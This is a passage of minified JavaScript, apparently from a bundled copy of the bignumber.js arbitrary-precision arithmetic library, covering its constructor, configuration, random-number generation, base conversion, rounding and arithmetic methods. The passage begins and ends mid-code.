                }, ce = new Re(1), q = 20, L = 4, U = -7, Z = 21, te = -1e7, se = 1e7, de = !1, re = 1, $ = 0, ie = {
                    prefix: "",
                    groupSize: 3,
                    secondaryGroupSize: 0,
                    groupSeparator: ",",
                    decimalSeparator: ".",
                    fractionGroupSize: 0,
                    fractionGroupSeparator: "",
                    suffix: ""
                }, ve = "0123456789abcdefghijklmnopqrstuvwxyz", ge = !0;
                function Re($e, Ne) {
                    var qe, Ve, lt, nt, je, Ke, Qe, We, mt = this;
                    if (!(mt instanceof Re))
                        return new Re($e,Ne);
                    if (Ne == null) {
                        if ($e && $e._isBigNumber === !0) {
                            mt.s = $e.s,
                            !$e.c || $e.e > se ? mt.c = mt.e = null : $e.e < te ? mt.c = [mt.e = 0] : (mt.e = $e.e,
                            mt.c = $e.c.slice());
                            return
                        }
                        if ((Ke = typeof $e == "number") && $e * 0 == 0) {
                            if (mt.s = 1 / $e < 0 ? ($e = -$e,
                            -1) : 1,
                            $e === ~~$e) {
                                for (nt = 0,
                                je = $e; je >= 10; je /= 10,
                                nt++)
                                    ;
                                nt > se ? mt.c = mt.e = null : (mt.e = nt,
                                mt.c = [$e]);
                                return
                            }
                            We = String($e)
                        } else {
                            if (!O.test(We = String($e)))
                                return Ee(mt, We, Ke);
                            mt.s = We.charCodeAt(0) == 45 ? (We = We.slice(1),
                            -1) : 1
                        }
                        (nt = We.indexOf(".")) > -1 && (We = We.replace(".", "")),
                        (je = We.search(/e/i)) > 0 ? (nt < 0 && (nt = je),
                        nt += +We.slice(je + 1),
                        We = We.substring(0, je)) : nt < 0 && (nt = We.length)
                    } else {
                        if (fe(Ne, 2, ve.length, "Base"),
                        Ne == 10 && ge)
                            return mt = new Re($e),
                            Le(mt, q + mt.e + 1, L);
                        if (We = String($e),
                        Ke = typeof $e == "number") {
                            if ($e * 0 != 0)
                                return Ee(mt, We, Ke, Ne);
                            if (mt.s = 1 / $e < 0 ? (We = We.slice(1),
                            -1) : 1,
                            Re.DEBUG && We.replace(/^0\.0*|\./, "").length > 15)
                                throw Error(X + $e)
                        } else
                            mt.s = We.charCodeAt(0) === 45 ? (We = We.slice(1),
                            -1) : 1;
                        for (qe = ve.slice(0, Ne),
                        nt = je = 0,
                        Qe = We.length; je < Qe; je++)
                            if (qe.indexOf(Ve = We.charAt(je)) < 0) {
                                if (Ve == ".") {
                                    if (je > nt) {
                                        nt = Qe;
                                        continue
                                    }
                                } else if (!lt && (We == We.toUpperCase() && (We = We.toLowerCase()) || We == We.toLowerCase() && (We = We.toUpperCase()))) {
                                    lt = !0,
                                    je = -1,
                                    nt = 0;
                                    continue
                                }
                                return Ee(mt, String($e), Ke, Ne)
                            }
                        Ke = !1,
                        We = Ae(We, Ne, 10, mt.s),
                        (nt = We.indexOf(".")) > -1 ? We = We.replace(".", "") : nt = We.length
                    }
                    for (je = 0; We.charCodeAt(je) === 48; je++)
                        ;
                    for (Qe = We.length; We.charCodeAt(--Qe) === 48; )
                        ;
                    if (We = We.slice(je, ++Qe)) {
                        if (Qe -= je,
                        Ke && Re.DEBUG && Qe > 15 && ($e > V || $e !== w($e)))
                            throw Error(X + mt.s * $e);
                        if ((nt = nt - je - 1) > se)
                            mt.c = mt.e = null;
                        else if (nt < te)
                            mt.c = [mt.e = 0];
                        else {
                            if (mt.e = nt,
                            mt.c = [],
                            je = (nt + 1) % F,
                            nt < 0 && (je += F),
                            je < Qe) {
                                for (je && mt.c.push(+We.slice(0, je)),
                                Qe -= F; je < Qe; )
                                    mt.c.push(+We.slice(je, je += F));
                                je = F - (We = We.slice(je)).length
                            } else
                                je -= Qe;
                            for (; je--; We += "0")
                                ;
                            mt.c.push(+We)
                        }
                    } else
                        mt.c = [mt.e = 0]
                }
                Re.clone = ae,
                Re.ROUND_UP = 0,
                Re.ROUND_DOWN = 1,
                Re.ROUND_CEIL = 2,
                Re.ROUND_FLOOR = 3,
                Re.ROUND_HALF_UP = 4,
                Re.ROUND_HALF_DOWN = 5,
                Re.ROUND_HALF_EVEN = 6,
                Re.ROUND_HALF_CEIL = 7,
                Re.ROUND_HALF_FLOOR = 8,
                Re.EUCLID = 9,
                Re.config = Re.set = function($e) {
                    var Ne, qe;
                    if ($e != null)
                        if (typeof $e == "object") {
                            if ($e.hasOwnProperty(Ne = "DECIMAL_PLACES") && (qe = $e[Ne],
                            fe(qe, 0, ee, Ne),
                            q = qe),
                            $e.hasOwnProperty(Ne = "ROUNDING_MODE") && (qe = $e[Ne],
                            fe(qe, 0, 8, Ne),
                            L = qe),
                            $e.hasOwnProperty(Ne = "EXPONENTIAL_AT") && (qe = $e[Ne],
                            qe && qe.pop ? (fe(qe[0], -1e9, 0, Ne),
                            fe(qe[1], 0, ee, Ne),
                            U = qe[0],
                            Z = qe[1]) : (fe(qe, -1e9, ee, Ne),
                            U = -(Z = qe < 0 ? -qe : qe))),
                            $e.hasOwnProperty(Ne = "RANGE"))
                                if (qe = $e[Ne],
                                qe && qe.pop)
                                    fe(qe[0], -1e9, -1, Ne),
                                    fe(qe[1], 1, ee, Ne),
                                    te = qe[0],
                                    se = qe[1];
                                else if (fe(qe, -1e9, ee, Ne),
                                qe)
                                    te = -(se = qe < 0 ? -qe : qe);
                                else
                                    throw Error(b + Ne + " cannot be zero: " + qe);
                            if ($e.hasOwnProperty(Ne = "CRYPTO"))
                                if (qe = $e[Ne],
                                qe === !!qe)
                                    if (qe)
                                        if (typeof crypto < "u" && crypto && (crypto.getRandomValues || crypto.randomBytes))
                                            de = qe;
                                        else
                                            throw de = !qe,
                                            Error(b + "crypto unavailable");
                                    else
                                        de = qe;
                                else
                                    throw Error(b + Ne + " not true or false: " + qe);
                            if ($e.hasOwnProperty(Ne = "MODULO_MODE") && (qe = $e[Ne],
                            fe(qe, 0, 9, Ne),
                            re = qe),
                            $e.hasOwnProperty(Ne = "POW_PRECISION") && (qe = $e[Ne],
                            fe(qe, 0, ee, Ne),
                            $ = qe),
                            $e.hasOwnProperty(Ne = "FORMAT"))
                                if (qe = $e[Ne],
                                typeof qe == "object")
                                    ie = qe;
                                else
                                    throw Error(b + Ne + " not an object: " + qe);
                            if ($e.hasOwnProperty(Ne = "ALPHABET"))
                                if (qe = $e[Ne],
                                typeof qe == "string" && !/^.?$|[+\-.\s]|(.).*\1/.test(qe))
                                    ge = qe.slice(0, 10) == "0123456789",
                                    ve = qe;
                                else
                                    throw Error(b + Ne + " invalid: " + qe)
                        } else
                            throw Error(b + "Object expected: " + $e);
                    return {
                        DECIMAL_PLACES: q,
                        ROUNDING_MODE: L,
                        EXPONENTIAL_AT: [U, Z],
                        RANGE: [te, se],
                        CRYPTO: de,
                        MODULO_MODE: re,
                        POW_PRECISION: $,
                        FORMAT: ie,
                        ALPHABET: ve
                    }
                }
                ,
                Re.isBigNumber = function($e) {
                    if (!$e || $e._isBigNumber !== !0)
                        return !1;
                    if (!Re.DEBUG)
                        return !0;
                    var Ne, qe, Ve = $e.c, lt = $e.e, nt = $e.s;
                    e: if ({}.toString.call(Ve) == "[object Array]") {
                        if ((nt === 1 || nt === -1) && lt >= -1e9 && lt <= ee && lt === w(lt)) {
                            if (Ve[0] === 0) {
                                if (lt === 0 && Ve.length === 1)
                                    return !0;
                                break e
                            }
                            if (Ne = (lt + 1) % F,
                            Ne < 1 && (Ne += F),
                            String(Ve[0]).length == Ne) {
                                for (Ne = 0; Ne < Ve.length; Ne++)
                                    if (qe = Ve[Ne],
                                    qe < 0 || qe >= Y || qe !== w(qe))
                                        break e;
                                if (qe !== 0)
                                    return !0
                            }
                        }
                    } else if (Ve === null && lt === null && (nt === null || nt === 1 || nt === -1))
                        return !0;
                    throw Error(b + "Invalid BigNumber: " + $e)
                }
                ,
                Re.maximum = Re.max = function() {
                    return Ie(arguments, -1)
                }
                ,
                Re.minimum = Re.min = function() {
                    return Ie(arguments, 1)
                }
                ,
                Re.random = function() {
                    var $e = 9007199254740992
                      , Ne = Math.random() * $e & 2097151 ? function() {
                        return w(Math.random() * $e)
                    }
                    : function() {
                        return (Math.random() * 1073741824 | 0) * 8388608 + (Math.random() * 8388608 | 0)
                    }
                    ;
                    return function(qe) {
                        var Ve, lt, nt, je, Ke, Qe = 0, We = [], mt = new Re(ce);
                        if (qe == null ? qe = q : fe(qe, 0, ee),
                        je = x(qe / F),
                        de)
                            if (crypto.getRandomValues) {
                                for (Ve = crypto.getRandomValues(new Uint32Array(je *= 2)); Qe < je; )
                                    Ke = Ve[Qe] * 131072 + (Ve[Qe + 1] >>> 11),
                                    Ke >= 9e15 ? (lt = crypto.getRandomValues(new Uint32Array(2)),
                                    Ve[Qe] = lt[0],
                                    Ve[Qe + 1] = lt[1]) : (We.push(Ke % 1e14),
                                    Qe += 2);
                                Qe = je / 2
                            } else if (crypto.randomBytes) {
                                for (Ve = crypto.randomBytes(je *= 7); Qe < je; )
                                    Ke = (Ve[Qe] & 31) * 281474976710656 + Ve[Qe + 1] * 1099511627776 + Ve[Qe + 2] * 4294967296 + Ve[Qe + 3] * 16777216 + (Ve[Qe + 4] << 16) + (Ve[Qe + 5] << 8) + Ve[Qe + 6],
                                    Ke >= 9e15 ? crypto.randomBytes(7).copy(Ve, Qe) : (We.push(Ke % 1e14),
                                    Qe += 7);
                                Qe = je / 7
                            } else
                                throw de = !1,
                                Error(b + "crypto unavailable");
                        if (!de)
                            for (; Qe < je; )
                                Ke = Ne(),
                                Ke < 9e15 && (We[Qe++] = Ke % 1e14);
                        for (je = We[--Qe],
                        qe %= F,
                        je && qe && (Ke = K[F - qe],
                        We[Qe] = w(je / Ke) * Ke); We[Qe] === 0; We.pop(),
                        Qe--)
                            ;
                        if (Qe < 0)
                            We = [nt = 0];
                        else {
                            for (nt = -1; We[0] === 0; We.splice(0, 1),
                            nt -= F)
                                ;
                            for (Qe = 1,
                            Ke = We[0]; Ke >= 10; Ke /= 10,
                            Qe++)
                                ;
                            Qe < F && (nt -= F - Qe)
                        }
                        return mt.e = nt,
                        mt.c = We,
                        mt
                    }
                }(),
                Re.sum = function() {
                    for (var $e = 1, Ne = arguments, qe = new Re(Ne[0]); $e < Ne.length; )
                        qe = qe.plus(Ne[$e++]);
                    return qe
                }
                ,
                Ae = function() {
                    var $e = "0123456789";
                    function Ne(qe, Ve, lt, nt) {
                        for (var je, Ke = [0], Qe, We = 0, mt = qe.length; We < mt; ) {
                            for (Qe = Ke.length; Qe--; Ke[Qe] *= Ve)
                                ;
                            for (Ke[0] += nt.indexOf(qe.charAt(We++)),
                            je = 0; je < Ke.length; je++)
                                Ke[je] > lt - 1 && (Ke[je + 1] == null && (Ke[je + 1] = 0),
                                Ke[je + 1] += Ke[je] / lt | 0,
                                Ke[je] %= lt)
                        }
                        return Ke.reverse()
                    }
                    return function(qe, Ve, lt, nt, je) {
                        var Ke, Qe, We, mt, ct, vt, we, _e, Ce = qe.indexOf("."), st = q, et = L;
                        for (Ce >= 0 && (mt = $,
                        $ = 0,
                        qe = qe.replace(".", ""),
                        _e = new Re(Ve),
                        vt = _e.pow(qe.length - Ce),
                        $ = mt,
                        _e.c = Ne(ye(oe(vt.c), vt.e, "0"), 10, lt, $e),
                        _e.e = _e.c.length),
                        we = Ne(qe, Ve, lt, je ? (Ke = ve,
                        $e) : (Ke = $e,
                        ve)),
                        We = mt = we.length; we[--mt] == 0; we.pop())
                            ;
                        if (!we[0])
                            return Ke.charAt(0);
                        if (Ce < 0 ? --We : (vt.c = we,
                        vt.e = We,
                        vt.s = nt,
                        vt = xe(vt, _e, st, et, lt),
                        we = vt.c,
                        ct = vt.r,
                        We = vt.e),
                        Qe = We + st + 1,
                        Ce = we[Qe],
                        mt = lt / 2,
                        ct = ct || Qe < 0 || we[Qe + 1] != null,
                        ct = et < 4 ? (Ce != null || ct) && (et == 0 || et == (vt.s < 0 ? 3 : 2)) : Ce > mt || Ce == mt && (et == 4 || ct || et == 6 && we[Qe - 1] & 1 || et == (vt.s < 0 ? 8 : 7)),
                        Qe < 1 || !we[0])
                            qe = ct ? ye(Ke.charAt(1), -st, Ke.charAt(0)) : Ke.charAt(0);
                        else {
                            if (we.length = Qe,
                            ct)
                                for (--lt; ++we[--Qe] > lt; )
                                    we[Qe] = 0,
                                    Qe || (++We,
                                    we = [1].concat(we));
                            for (mt = we.length; !we[--mt]; )
                                ;
                            for (Ce = 0,
                            qe = ""; Ce <= mt; qe += Ke.charAt(we[Ce++]))
                                ;
                            qe = ye(qe, We, Ke.charAt(0))
                        }
                        return qe
                    }
                }(),
                xe = function() {
                    function $e(Ve, lt, nt) {
                        var je, Ke, Qe, We, mt = 0, ct = Ve.length, vt = lt % Q, we = lt / Q | 0;
                        for (Ve = Ve.slice(); ct--; )
                            Qe = Ve[ct] % Q,
                            We = Ve[ct] / Q | 0,
                            je = we * Qe + We * vt,
                            Ke = vt * Qe + je % Q * Q + mt,
                            mt = (Ke / nt | 0) + (je / Q | 0) + we * We,
                            Ve[ct] = Ke % nt;
                        return mt && (Ve = [mt].concat(Ve)),
                        Ve
                    }
                    function Ne(Ve, lt, nt, je) {
                        var Ke, Qe;
                        if (nt != je)
                            Qe = nt > je ? 1 : -1;
                        else
                            for (Ke = Qe = 0; Ke < nt; Ke++)
                                if (Ve[Ke] != lt[Ke]) {
                                    Qe = Ve[Ke] > lt[Ke] ? 1 : -1;
                                    break
                                }
                        return Qe
                    }
                    function qe(Ve, lt, nt, je) {
                        for (var Ke = 0; nt--; )
                            Ve[nt] -= Ke,
                            Ke = Ve[nt] < lt[nt] ? 1 : 0,
                            Ve[nt] = Ke * je + Ve[nt] - lt[nt];
                        for (; !Ve[0] && Ve.length > 1; Ve.splice(0, 1))
                            ;
                    }
                    return function(Ve, lt, nt, je, Ke) {
                        var Qe, We, mt, ct, vt, we, _e, Ce, st, et, tt, He, ke, Me, Ue, rt, dt, Et = Ve.s == lt.s ? 1 : -1, ft = Ve.c, gt = lt.c;
                        if (!ft || !ft[0] || !gt || !gt[0])
                            return new Re(!Ve.s || !lt.s || (ft ? gt && ft[0] == gt[0] : !gt) ? NaN : ft && ft[0] == 0 || !gt ? Et * 0 : Et / 0);
                        for (Ce = new Re(Et),
                        st = Ce.c = [],
                        We = Ve.e - lt.e,
                        Et = nt + We + 1,
                        Ke || (Ke = Y,
                        We = ne(Ve.e / F) - ne(lt.e / F),
                        Et = Et / F | 0),
                        mt = 0; gt[mt] == (ft[mt] || 0); mt++)
                            ;
                        if (gt[mt] > (ft[mt] || 0) && We--,
                        Et < 0)
                            st.push(1),
                            ct = !0;
                        else {
                            for (Me = ft.length,
                            rt = gt.length,
                            mt = 0,
                            Et += 2,
                            vt = w(Ke / (gt[0] + 1)),
                            vt > 1 && (gt = $e(gt, vt, Ke),
                            ft = $e(ft, vt, Ke),
                            rt = gt.length,
                            Me = ft.length),
                            ke = rt,
                            et = ft.slice(0, rt),
                            tt = et.length; tt < rt; et[tt++] = 0)
                                ;
                            dt = gt.slice(),
                            dt = [0].concat(dt),
                            Ue = gt[0],
                            gt[1] >= Ke / 2 && Ue++;
                            do {
                                if (vt = 0,
                                Qe = Ne(gt, et, rt, tt),
                                Qe < 0) {
                                    if (He = et[0],
                                    rt != tt && (He = He * Ke + (et[1] || 0)),
                                    vt = w(He / Ue),
                                    vt > 1)
                                        for (vt >= Ke && (vt = Ke - 1),
                                        we = $e(gt, vt, Ke),
                                        _e = we.length,
                                        tt = et.length; Ne(we, et, _e, tt) == 1; )
                                            vt--,
                                            qe(we, rt < _e ? dt : gt, _e, Ke),
                                            _e = we.length,
                                            Qe = 1;
                                    else
                                        vt == 0 && (Qe = vt = 1),
                                        we = gt.slice(),
                                        _e = we.length;
                                    if (_e < tt && (we = [0].concat(we)),
                                    qe(et, we, tt, Ke),
                                    tt = et.length,
                                    Qe == -1)
                                        for (; Ne(gt, et, rt, tt) < 1; )
                                            vt++,
                                            qe(et, rt < tt ? dt : gt, tt, Ke),
                                            tt = et.length
                                } else
                                    Qe === 0 && (vt++,
                                    et = [0]);
                                st[mt++] = vt,
                                et[0] ? et[tt++] = ft[ke] || 0 : (et = [ft[ke]],
                                tt = 1)
                            } while ((ke++ < Me || et[0] != null) && Et--);
                            ct = et[0] != null,
                            st[0] || st.splice(0, 1)
                        }
                        if (Ke == Y) {
                            for (mt = 1,
                            Et = st[0]; Et >= 10; Et /= 10,
                            mt++)
                                ;
                            Le(Ce, nt + (Ce.e = mt + We * F - 1) + 1, je, ct)
                        } else
                            Ce.e = We,
                            Ce.r = +ct;
                        return Ce
                    }
                }();
                function Pe($e, Ne, qe, Ve) {
                    var lt, nt, je, Ke, Qe;
                    if (qe == null ? qe = L : fe(qe, 0, 8),
                    !$e.c)
                        return $e.toString();
                    if (lt = $e.c[0],
                    je = $e.e,
                    Ne == null)
                        Qe = oe($e.c),
                        Qe = Ve == 1 || Ve == 2 && (je <= U || je >= Z) ? pe(Qe, je) : ye(Qe, je, "0");
                    else if ($e = Le(new Re($e), Ne, qe),
                    nt = $e.e,
                    Qe = oe($e.c),
                    Ke = Qe.length,
                    Ve == 1 || Ve == 2 && (Ne <= nt || nt <= U)) {
                        for (; Ke < Ne; Qe += "0",
                        Ke++)
                            ;
                        Qe = pe(Qe, nt)
                    } else if (Ne -= je,
                    Qe = ye(Qe, nt, "0"),
                    nt + 1 > Ke) {
                        if (--Ne > 0)
                            for (Qe += "."; Ne--; Qe += "0")
                                ;
                    } else if (Ne += nt - Ke,
                    Ne > 0)
                        for (nt + 1 == Ke && (Qe += "."); Ne--; Qe += "0")
                            ;
                    return $e.s < 0 && lt ? "-" + Qe : Qe
                }
                function Ie($e, Ne) {
                    for (var qe, Ve, lt = 1, nt = new Re($e[0]); lt < $e.length; lt++)
                        Ve = new Re($e[lt]),
                        (!Ve.s || (qe = ue(nt, Ve)) === Ne || qe === 0 && nt.s === Ne) && (nt = Ve);
                    return nt
                }
                function Te($e, Ne, qe) {
                    for (var Ve = 1, lt = Ne.length; !Ne[--lt]; Ne.pop())
                        ;
                    for (lt = Ne[0]; lt >= 10; lt /= 10,
                    Ve++)
                        ;
                    return (qe = Ve + qe * F - 1) > se ? $e.c = $e.e = null : qe < te ? $e.c = [$e.e = 0] : ($e.e = qe,
                    $e.c = Ne),
                    $e
                }
                Ee = function() {
                    var $e = /^(-?)0([xbo])(?=\w[\w.]*$)/i
                      , Ne = /^([^.]+)\.$/
                      , qe = /^\.([^.]+)$/
                      , Ve = /^-?(Infinity|NaN)$/
                      , lt = /^\s*\+(?=[\w.])|^\s+|\s+$/g;
                    return function(nt, je, Ke, Qe) {
                        var We, mt = Ke ? je : je.replace(lt, "");
                        if (Ve.test(mt))
                            nt.s = isNaN(mt) ? null : mt < 0 ? -1 : 1;
                        else {
                            if (!Ke && (mt = mt.replace($e, function(ct, vt, we) {
                                return We = (we = we.toLowerCase()) == "x" ? 16 : we == "b" ? 2 : 8,
                                !Qe || Qe == We ? vt : ct
                            }),
                            Qe && (We = Qe,
                            mt = mt.replace(Ne, "$1").replace(qe, "0.$1")),
                            je != mt))
                                return new Re(mt,We);
                            if (Re.DEBUG)
                                throw Error(b + "Not a" + (Qe ? " base " + Qe : "") + " number: " + je);
                            nt.s = null
                        }
                        nt.c = nt.e = null
                    }
                }();
                function Le($e, Ne, qe, Ve) {
                    var lt, nt, je, Ke, Qe, We, mt, ct = $e.c, vt = K;
                    if (ct) {
                        e: {
                            for (lt = 1,
                            Ke = ct[0]; Ke >= 10; Ke /= 10,
                            lt++)
                                ;
                            if (nt = Ne - lt,
                            nt < 0)
                                nt += F,
                                je = Ne,
                                Qe = ct[We = 0],
                                mt = w(Qe / vt[lt - je - 1] % 10);
                            else if (We = x((nt + 1) / F),
                            We >= ct.length)
                                if (Ve) {
                                    for (; ct.length <= We; ct.push(0))
                                        ;
                                    Qe = mt = 0,
                                    lt = 1,
                                    nt %= F,
                                    je = nt - F + 1
                                } else
                                    break e;
                            else {
                                for (Qe = Ke = ct[We],
                                lt = 1; Ke >= 10; Ke /= 10,
                                lt++)
                                    ;
                                nt %= F,
                                je = nt - F + lt,
                                mt = je < 0 ? 0 : w(Qe / vt[lt - je - 1] % 10)
                            }
                            if (Ve = Ve || Ne < 0 || ct[We + 1] != null || (je < 0 ? Qe : Qe % vt[lt - je - 1]),
                            Ve = qe < 4 ? (mt || Ve) && (qe == 0 || qe == ($e.s < 0 ? 3 : 2)) : mt > 5 || mt == 5 && (qe == 4 || Ve || qe == 6 && (nt > 0 ? je > 0 ? Qe / vt[lt - je] : 0 : ct[We - 1]) % 10 & 1 || qe == ($e.s < 0 ? 8 : 7)),
                            Ne < 1 || !ct[0])
                                return ct.length = 0,
                                Ve ? (Ne -= $e.e + 1,
                                ct[0] = vt[(F - Ne % F) % F],
                                $e.e = -Ne || 0) : ct[0] = $e.e = 0,
                                $e;
                            if (nt == 0 ? (ct.length = We,
                            Ke = 1,
                            We--) : (ct.length = We + 1,
                            Ke = vt[F - nt],
                            ct[We] = je > 0 ? w(Qe / vt[lt - je] % vt[je]) * Ke : 0),
                            Ve)
                                for (; ; )
                                    if (We == 0) {
                                        for (nt = 1,
                                        je = ct[0]; je >= 10; je /= 10,
                                        nt++)
                                            ;
                                        for (je = ct[0] += Ke,
                                        Ke = 1; je >= 10; je /= 10,
                                        Ke++)
                                            ;
                                        nt != Ke && ($e.e++,
                                        ct[0] == Y && (ct[0] = 1));
                                        break
                                    } else {
                                        if (ct[We] += Ke,
                                        ct[We] != Y)
                                            break;
                                        ct[We--] = 0,
                                        Ke = 1
                                    }
                            for (nt = ct.length; ct[--nt] === 0; ct.pop())
                                ;
                        }
                        $e.e > se ? $e.c = $e.e = null : $e.e < te && ($e.c = [$e.e = 0])
                    }
                    return $e
                }
                function Ze($e) {
                    var Ne, qe = $e.e;
                    return qe === null ? $e.toString() : (Ne = oe($e.c),
                    Ne = qe <= U || qe >= Z ? pe(Ne, qe) : ye(Ne, qe, "0"),
                    $e.s < 0 ? "-" + Ne : Ne)
                }
                return Be.absoluteValue = Be.abs = function() {
                    var $e = new Re(this);
                    return $e.s < 0 && ($e.s = 1),
                    $e
                }
                ,
                Be.comparedTo = function($e, Ne) {
                    return ue(this, new Re($e,Ne))
                }
                ,
                Be.decimalPlaces = Be.dp = function($e, Ne) {
                    var qe, Ve, lt, nt = this;
                    if ($e != null)
                        return fe($e, 0, ee),
                        Ne == null ? Ne = L : fe(Ne, 0, 8),
                        Le(new Re(nt), $e + nt.e + 1, Ne);
                    if (!(qe = nt.c))
                        return null;
                    if (Ve = ((lt = qe.length - 1) - ne(this.e / F)) * F,
                    lt = qe[lt])
                        for (; lt % 10 == 0; lt /= 10,
                        Ve--)
                            ;
                    return Ve < 0 && (Ve = 0),
                    Ve
                }
                ,
                Be.dividedBy = Be.div = function($e, Ne) {
                    return xe(this, new Re($e,Ne), q, L)
                }
                ,
                Be.dividedToIntegerBy = Be.idiv = function($e, Ne) {
                    return xe(this, new Re($e,Ne), 0, 1)
                }
                ,
                Be.exponentiatedBy = Be.pow = function($e, Ne) {
                    var qe, Ve, lt, nt, je, Ke, Qe, We, mt, ct = this;
                    if ($e = new Re($e),
                    $e.c && !$e.isInteger())
                        throw Error(b + "Exponent not an integer: " + Ze($e));
                    if (Ne != null && (Ne = new Re(Ne)),
                    Ke = $e.e > 14,
                    !ct.c || !ct.c[0] || ct.c[0] == 1 && !ct.e && ct.c.length == 1 || !$e.c || !$e.c[0])
                        return mt = new Re(Math.pow(+Ze(ct), Ke ? $e.s * (2 - he($e)) : +Ze($e))),
                        Ne ? mt.mod(Ne) : mt;
                    if (Qe = $e.s < 0,
                    Ne) {
                        if (Ne.c ? !Ne.c[0] : !Ne.s)
                            return new Re(NaN);
                        Ve = !Qe && ct.isInteger() && Ne.isInteger(),
                        Ve && (ct = ct.mod(Ne))
                    } else {
                        if ($e.e > 9 && (ct.e > 0 || ct.e < -1 || (ct.e == 0 ? ct.c[0] > 1 || Ke && ct.c[1] >= 24e7 : ct.c[0] < 8e13 || Ke && ct.c[0] <= 9999975e7)))
                            return nt = ct.s < 0 && he($e) ? -0 : 0,
                            ct.e > -1 && (nt = 1 / nt),
                            new Re(Qe ? 1 / nt : nt);
                        $ && (nt = x($ / F + 2))
                    }
                    for (Ke ? (qe = new Re(.5),
                    Qe && ($e.s = 1),
                    We = he($e)) : (lt = Math.abs(+Ze($e)),
                    We = lt % 2),
                    mt = new Re(ce); ; ) {
                        if (We) {
                            if (mt = mt.times(ct),
                            !mt.c)
                                break;
                            nt ? mt.c.length > nt && (mt.c.length = nt) : Ve && (mt = mt.mod(Ne))
                        }
                        if (lt) {
                            if (lt = w(lt / 2),
                            lt === 0)
                                break;
                            We = lt % 2
                        } else if ($e = $e.times(qe),
                        Le($e, $e.e + 1, 1),
                        $e.e > 14)
                            We = he($e);
                        else {
                            if (lt = +Ze($e),
                            lt === 0)
                                break;
                            We = lt % 2
                        }
                        ct = ct.times(ct),
                        nt ? ct.c && ct.c.length > nt && (ct.c.length = nt) : Ve && (ct = ct.mod(Ne))
                    }
                    return Ve ? mt : (Qe && (mt = ce.div(mt)),
                    Ne ? mt.mod(Ne) : nt ? Le(mt, $, L, je) : mt)
                }
                ,
                Be.integerValue = function($e) {
                    var Ne = new Re(this);
                    return $e == null ? $e = L : fe($e, 0, 8),
                    Le(Ne, Ne.e + 1, $e)
                }
                ,
                Be.isEqualTo = Be.eq = function($e, Ne) {
                    return ue(this, new Re($e,Ne)) === 0
                }
                ,
                Be.isFinite = function() {
                    return !!this.c
                }
                ,
                Be.isGreaterThan = Be.gt = function($e, Ne) {
                    return ue(this, new Re($e,Ne)) > 0
                }
                ,
                Be.isGreaterThanOrEqualTo = Be.gte = function($e, Ne) {
                    return (Ne = ue(this, new Re($e,Ne))) === 1 || Ne === 0
                }
                ,
                Be.isInteger = function() {
                    return !!this.c && ne(this.e / F) > this.c.length - 2
                }
                ,
                Be.isLessThan = Be.lt = function($e, Ne) {
                    return ue(this, new Re($e,Ne)) < 0
                }
                ,
                Be.isLessThanOrEqualTo = Be.lte = function($e, Ne) {
                    return (Ne = ue(this, new Re($e,Ne))) === -1 || Ne === 0
                }
                ,
                Be.isNaN = function() {
                    return !this.s
                }
                ,
                Be.isNegative = function() {
                    return this.s < 0
                }
                ,
                Be.isPositive = function() {
                    return this.s > 0
                }
                ,
                Be.isZero = function() {
                    return !!this.c && this.c[0] == 0
                }
                ,
                Be.minus = function($e, Ne) {
                    var qe, Ve, lt, nt, je = this, Ke = je.s;
                    if ($e = new Re($e,Ne),
                    Ne = $e.s,
                    !Ke || !Ne)
                        return new Re(NaN);
                    if (Ke != Ne)
                        return $e.s = -Ne,
                        je.plus($e);
                    var Qe = je.e / F
                      , We = $e.e / F
                      , mt = je.c
                      , ct = $e.c;
                    if (!Qe || !We) {
                        if (!mt || !ct)
                            return mt ? ($e.s = -Ne,
                            $e) : new Re(ct ? je : NaN);
                        if (!mt[0] || !ct[0])
                            return ct[0] ? ($e.s = -Ne,
                            $e) : new Re(mt[0] ? je : L == 3 ? -0 : 0)
                    }
                    if (Qe = ne(Qe),
                    We = ne(We),
                    mt = mt.slice(),
                    Ke = Qe - We) {
                        for ((nt = Ke < 0) ? (Ke = -Ke,
                        lt = mt) : (We = Qe,
                        lt = ct),
                        lt.reverse(),
                        Ne = Ke; Ne--; lt.push(0))
                            ;
                        lt.reverse()
                    } else
                        for (Ve = (nt = (Ke = mt.length) < (Ne = ct.length)) ? Ke : Ne,
                        Ke = Ne = 0; Ne < Ve; Ne++)
                            if (mt[Ne] != ct[Ne]) {
                                nt = mt[Ne] < ct[Ne];
                                break
                            }
                    if (nt && (lt = mt,
                    mt = ct,
                    ct = lt,
                    $e.s = -$e.s),
                    Ne = (Ve = ct.length) - (qe = mt.length),
                    Ne > 0)
                        for (; Ne--; mt[qe++] = 0)
                            ;
                    for (Ne = Y - 1; Ve > Ke; ) {
                        if (mt[--Ve] < ct[Ve]) {
                            for (qe = Ve; qe && !mt[--qe]; mt[qe] = Ne)
                                ;
                            --mt[qe],
                            mt[Ve] += Y
                        }
                        mt[Ve] -= ct[Ve]
                    }
                    for (; mt[0] == 0; mt.splice(0, 1),
                    --We)
                        ;
                    return mt[0] ? Te($e, mt, We) : ($e.s = L == 3 ? -1 : 1,
                    $e.c = [$e.e = 0],
                    $e)
                }
                ,
                Be.modulo = Be.mod = function($e, Ne) {
                    var qe, Ve, lt = this;
                    return $e = new Re($e,Ne),
                    !lt.c || !$e.s || $e.c && !$e.c[0] ? new Re(NaN) : !$e.c || lt.c && !lt.c[0] ? new Re(lt) : (re == 9 ? (Ve = $e.s,
                    $e.s = 1,
                    qe = xe(lt, $e, 0, 3),
                    $e.s = Ve,
                    qe.s *= Ve) : qe = xe(lt, $e, 0, re),
                    $e = lt.minus(qe.times($e)),
                    !$e.c[0] && re == 1 && ($e.s = lt.s),
                    $e)
                }
                ,
                Be.multipliedBy = Be.times = function($e, Ne) {
                    var qe, Ve, lt, nt, je, Ke, Qe, We, mt, ct, vt, we, _e, Ce, st, et = this, tt = et.c, He = ($e = new Re($e,Ne)).c;
                    if (!tt || !He || !tt[0] || !He[0])
                        return !et.s || !$e.s || tt && !tt[0] && !He || He && !He[0] && !tt ? $e.c = $e.e = $e.s = null : ($e.s *= et.s,
                        !tt || !He ? $e.c = $e.e = null : ($e.c = [0],
                        $e.e = 0)),
                        $e;
                    for (Ve = ne(et.e / F) + ne($e.e / F),
                    $e.s *= et.s,
                    Qe = tt.length,
                    ct = He.length,
                    Qe < ct && (_e = tt,
                    tt = He,
                    He = _e,
                    lt = Qe,
                    Qe = ct,
                    ct = lt),
                    lt = Qe + ct,
                    _e = []; lt--; _e.push(0))
                        ;
                    for (Ce = Y,
                    st = Q,
                    lt = ct; --lt >= 0; ) {
